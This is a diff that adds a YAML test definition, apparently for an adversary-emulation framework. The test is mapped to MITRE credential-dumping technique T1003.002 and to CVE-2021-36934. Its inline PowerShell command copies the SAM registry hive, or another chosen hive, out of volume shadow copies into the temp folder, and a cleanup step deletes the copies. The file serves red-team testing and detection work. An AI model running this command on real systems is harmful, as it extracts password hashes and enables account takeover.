@@ -1,0 +1,32 @@
+api_version: "2.0"
+name: dump volume shadow copy hives with System.IO.File
+description: |
+    Dump hives from volume shadow copies with System.IO.File. [CVE-2021-36934](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36934)
+args:
+    - name: target_hive
+      type: string
+      default: SAM
+    - name: limit
+      type: integer
+      default: "10"
+uuid: 9d77fed7-05f8-476e-a81b-8ff0472c64d0
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+    techniques:
+        - 'T1003: OS Credential Dumping'
+    subtechniques:
+        - 'T1003.002: Security Account Manager'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: dump-volume-shadow-copy-hives-with-system.io.file
+      inline: "1..{{.Args.limit}} | % { \n try { [System.IO.File]::Copy(\"\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy$_\\Windows\\System32\\config\\{{.Args.target_hive}}\" , \"$env:TEMP\\{{.Args.target_hive}}vss$_\", \"true\") } catch {}\n ls \"$env:TEMP\\{{.Args.target_hive}}vss$_\" -ErrorAction Ignore\n}\n"
+      executor: powershell
+      cleanup:
+        inline: |
+            1..{{.Args.limit}} | % {
+              rm "$env:TEMP\{{.Args.target_hive}}vss$_" -ErrorAction Ignore
+            }
+        executor: powershell
